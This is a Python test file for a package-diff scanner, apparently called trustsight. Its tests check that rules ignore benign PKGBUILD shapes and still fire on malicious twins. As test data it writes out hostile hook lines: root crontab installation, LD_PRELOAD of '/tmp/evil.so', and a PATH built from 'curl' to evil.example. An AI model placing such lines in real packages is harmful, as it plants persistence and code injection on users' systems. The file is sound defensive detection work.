"""Malign false positives from the 2026-11-01..2026-11-03 watcher window.

Each case pins the benign shape the rule fired on and the true-positive twin
the fix must keep.
"""

from __future__ import annotations

import sys
from pathlib import Path

_ROOT = Path(__file__).resolve().parents[2]
sys.path.insert(0, str(_ROOT / "scripts"))
sys.path.insert(0, str(_ROOT))

from calibration_gates import shipped_config  # noqa: E402

from trustsight.analysis import scan_diff  # noqa: E402
from trustsight.config import load_config, load_rules  # noqa: E402


def _ids(diff, current_text=None):
    with shipped_config():
        fact = scan_diff(diff, rules=load_rules(), config=load_config(),
                         package_name="p", current_text=current_text)
    return {e.rule_id for e in fact.score_breakdown}


PKG = ("+pkgname=p\n+pkgver=1\n+pkgrel=1\n"
       "+sha256sums=('0000000000000000000000000000000000000000000000000000000000000000')\n")


def _hook(line: str) -> str:
    body = PKG + "+post_install() {\n+  " + line + "\n+}\n"
    return (
        "--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        f"@@ -0,0 +1,{len(body.splitlines())} @@\n" + body
    )


# --- H108: a filename is not the crontab command ---------------------------

def test_h108_filename_suffix_is_not_the_crontab_command():
    assert "H108" not in _ids(_hook("rm -f /etc/sudoers.d/dokku-crontab"))


def test_h108_still_fires_on_crontab_at_command_position():
    assert "H108" in _ids(_hook("crontab -u root /tmp/cron"))
    assert "H108" in _ids(_hook("crontab -"))


def test_h108_crontab_list_is_quiet():
    assert "H108" not in _ids(_hook("crontab -l"))


# --- X002: a same-line case arm is a label, not a command ------------------

_ARM_BASE = ("--- a/demo.install\n+++ b/demo.install\n@@ -1,3 +1,9 @@\n"
             " post_upgrade() {\n")
_ARM_CURRENT = "pkgname=p\npkgver=1\ninstall=demo.install\n"


def _arm(arm: str) -> str:
    return _ARM_BASE + (
        '+  case "$1" in\n'
        f'+    {arm}\n'
        "+  esac\n"
        " }\n"
    )


def test_x002_same_line_case_arm_is_not_a_command():
    assert "X002" not in _ids(_arm('"$1"/*) pids="$pids ${proc#/proc/}" ;;'),
                              _ARM_CURRENT)


def test_x002_still_fires_on_a_hidden_command_in_the_arm():
    assert "X002" in _ids(_arm('*) "$cmd" ;;'), _ARM_CURRENT)


# --- X024: a toolchain path assembled from a default expansion -------------

_CUDA = (
    PKG
    + "+build() {\n"
    '+  local cuda_root="${CUDAToolkit_ROOT:-${CUDA_PATH:-/opt/cuda}}"\n'
    '+  export PATH="$cuda_root/bin:$PATH"\n'
    "+}\n"
)


def test_x024_default_expanded_toolchain_path_is_trusted():
    assert "X024" not in _ids(_CUDA)


def test_x024_still_fires_on_an_undefined_path_variable():
    diff = PKG + "+build() {\n+  export PATH=\"$evil/bin:$PATH\"\n+}\n"
    assert "X024" in _ids(diff)


def test_x024_still_fires_on_a_command_substitution():
    diff = (PKG + "+build() {\n"
            '+  export PATH="$(curl -s https://evil.example)/bin:$PATH"\n+}\n')
    assert "X024" in _ids(diff)


# --- H025: trusted PATH appends are build plumbing -------------------------

def test_h025_trusted_path_appends_are_quiet():
    assert "H025" not in _ids(_CUDA)
    assert "H025" not in _ids(
        PKG + "+build() {\n+  export PATH=\"/opt/cuda/bin:$PATH\"\n+}\n")
    assert "H025" not in _ids(
        PKG + "+build() {\n+  export PATH=\"${srcdir}:${PATH}\"\n+}\n")


def test_h025_still_fires_on_an_untrusted_path():
    assert "H025" in _ids(
        PKG + "+build() {\n+  export PATH=\"$TMPDIR/bin:$PATH\"\n+}\n")


def test_h025_still_fires_on_ld_preload_and_flags():
    assert "H025" in _ids(
        PKG + "+build() {\n+  export LD_PRELOAD=/tmp/evil.so\n+}\n")
    assert "H025" in _ids(
        PKG + "+build() {\n+  export CFLAGS=\"-O0\"\n+}\n")


# --- SOURCE_BUCKET: large vendors' own hosts -------------------------------

_SHA = "'" + "0" * 64 + "'"


def _source(src: str, url: str) -> str:
    current = (f'pkgname=p\npkgver=1\npkgrel=1\nurl="{url}"\n'
               f'source=("old")\nsha256sums=({_SHA})\n')
    diff = ("--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,1 +1,2 @@\n"
            f'+source=("{src}")\n'
            f'-sha256sums=({_SHA})\n+sha256sums=({_SHA})\n')
    return diff, current


def test_source_bucket_accepts_large_vendor_hosts():
    cases = [
        ("https://anoma.ly/release/hex/files/x/hex",
         "https://github.com/anomalyco/hex"),
        ("https://qqdl.gtimg.cn/qqfile/QQ/x.AppImage",
         "https://im.qq.com/linuxqq/"),
        ("https://stable.dl2.discordapp.net/distro/app/x",
         "https://discord.com"),
        ("https://api.nuget.org/v3/index.json",
         "https://github.com/dotnet/dotnet"),
        ("https://download.opensuse.org/repositories/x/x.pkg.tar.zst",
         "https://www.audacityteam.org/"),
        ("https://invent.kde.org/utilities/kwi#commit=e54b",
         "https://invent.kde.org/utilities/kwi"),
    ]
    for src, url in cases:
        diff, current = _source(src, url)
        assert "SOURCE_BUCKET" not in _ids(diff, current), src


def test_source_bucket_still_flags_unknown_hosts():
    for src, url in [
        ("https://registry.yarnpkg.com", "https://github.com/electron/electron"),
        ("https://repo.wyrd.foo/a/x.tar.gz",
         "https://github.com/wyrd-company/devcontainer-builder"),
        ("https://evil.example/x.tar.gz", "https://github.com/a/b"),
    ]:
        diff, current = _source(src, url)
        assert "SOURCE_BUCKET" in _ids(diff, current), src
